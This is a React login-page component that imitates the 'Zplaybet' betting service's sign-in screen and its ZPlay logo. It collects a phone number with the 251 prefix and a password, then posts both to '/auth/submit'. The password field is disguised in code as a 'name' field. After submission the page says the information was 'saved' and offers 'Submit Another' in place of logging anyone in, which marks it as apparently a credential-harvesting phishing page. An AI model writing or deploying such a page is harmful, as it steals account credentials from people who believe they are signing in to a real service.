import { useState } from 'react';
import api from '../utils/api';
import styles from './LoginPage.module.css';

export default function LoginPage() {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    if (!name || !phone) {
      setError('Please fill in all fields');
      return;
    }

    const fullPhone = `251${phone}`;

    setLoading(true);
    try {
      await api.post('/auth/submit', { name, phone: fullPhone });
      setSuccess(true);
    } catch (err) {
      setError(err.response?.data?.message || 'Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  if (success) {
    return (
      <div className={styles.container}>
        <div className={styles.card}>
          <div className={styles.successCard}>
            <div className={styles.successIcon}>✓</div>
            <h2 className={styles.successTitle}>Submitted!</h2>
            <p className={styles.successText}>Your information has been saved successfully.</p>
            <button
              className={styles.loginBtn}
              onClick={() => { setSuccess(false); setName(''); setPhone(''); }}
            >
              Submit Another
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.container}>
      <div className={styles.card}>
        {/* Logo Section */}
        <div className={styles.logoSection}>
          <div className={styles.logoBox}>
            <ZPlayLogo />
          </div>
          <p className={styles.signInLabel}>Sign In.</p>
          <h1 className={styles.welcomeTitle}>Welcome Back!</h1>
          <p className={styles.signInSub}>
            Sign in with your <span className={styles.brandLink}>Zplaybet account</span> credentials to continue.
          </p>
        </div>

        {/* Form */}
        <form className={styles.form} onSubmit={handleSubmit} noValidate>
          {error && <div className={styles.errorBox}>{error}</div>}

          {/* Phone Field */}
          <div className={styles.phoneWrapper}>
            <span className={styles.countryCode}>251</span>
            <input
              type="tel"
              className={styles.phoneInput}
              placeholder="912345678"
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
              maxLength={9}
              inputMode="numeric"
              autoComplete="tel"
            />
          </div>

          {/* Name Field */}
          <input
            type="text"
            className={styles.input}
            placeholder="Password"
            value={name}
            onChange={(e) => setName(e.target.value)}
            autoComplete="name"
          />

          <button
            type="submit"
            className={styles.loginBtn}
            disabled={loading}
          >
            {loading ? 'Submitting...' : 'Login'}
          </button>
        </form>
      </div>
    </div>
  );
}

// ZPlay SVG Logo
function ZPlayLogo() {
  return (
    <svg
      viewBox="0 0 200 80"
      xmlns="http://www.w3.org/2000/svg"
      width="180"
      height="72"
      aria-label="ZPlay logo"
    >
      <defs>
        <linearGradient id="zGrad" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stopColor="#a855f7" />
          <stop offset="50%" stopColor="#6366f1" />
          <stop offset="100%" stopColor="#06b6d4" />
        </linearGradient>
        <linearGradient id="playGrad" x1="0%" y1="0%" x2="100%" y2="0%">
          <stop offset="0%" stopColor="#a855f7" />
          <stop offset="100%" stopColor="#ec4899" />
        </linearGradient>
      </defs>
      <text
        x="10"
        y="65"
        fontSize="72"
        fontWeight="900"
        fontFamily="Arial Black, sans-serif"
        fill="url(#zGrad)"
      >
        Z
      </text>
      <text
        x="72"
        y="60"
        fontSize="38"
        fontWeight="800"
        fontFamily="Arial Black, sans-serif"
        fill="url(#playGrad)"
      >
        PLAY
      </text>
    </svg>
  );
}
